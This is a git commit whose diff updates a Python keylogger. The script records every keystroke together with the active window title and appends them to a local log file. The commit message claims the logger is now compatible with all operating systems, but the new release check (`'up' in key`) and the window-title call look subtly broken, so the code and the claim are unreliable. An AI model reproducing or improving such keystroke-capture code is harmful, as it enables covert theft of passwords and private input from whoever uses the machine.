e1c9d93c8ffb3a02f50f2d653f13693c5c35723d
Nadav Nir <73201814+NN-7@users.noreply.github.com>
2025-09-23 17:35:51 +0300

    made improvements to the key logger
    - compatible with all operating systems
    - made the key logger only log when the key is released so no extra entries are made (often 2 key events are logged for when the key is pressed even though 1 character was typed because it is held for a moment)

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,15 @@
 import keyboard
-from win32gui import GetWindowText, GetForegroundWindow
+import pyautogui
 
 while True:
-    entry = f"Key Pressed: {keyboard.read_key()} Active Window: {GetWindowText(GetForegroundWindow())}" # make the entry by detecting the pressed key and active window
-    print(entry) # for debugging purposes
-    try:
-        with open("log", "a", encoding='utf-8') as log: # open the log file or make a new one if it doesnt exist
-            log.write(entry+'\n') # write the entry into the log
-        # Reads the key pressed and active window and writes it into a file.
-    except UnicodeEncodeError as e:
-        pass
+    key = keyboard.read_event() # get name of key pressed
+    if 'up' in key: # log only key releases so no extra entries are made (often 2 key events are logged for when the key is pressed even though 1 character was typed because it is held for a moment)
+        window_name = pyautogui.getActiveWindowTitle() # get the window name to know what context caused the keys to be pressed
+        entry = f"Key Pressed: {key} Active Window: {window_name}" # make the entry
+        print(entry) # for debugging purposes
+        try:
+            with open("log", "a", encoding='utf-8') as log: # open the log file or make a new one if it doesnt exist
+                log.write(entry+'\n') # write the entry into the log
+            # Reads the key pressed and active window and writes it into a file.
+        except UnicodeEncodeError as e:
+            pass
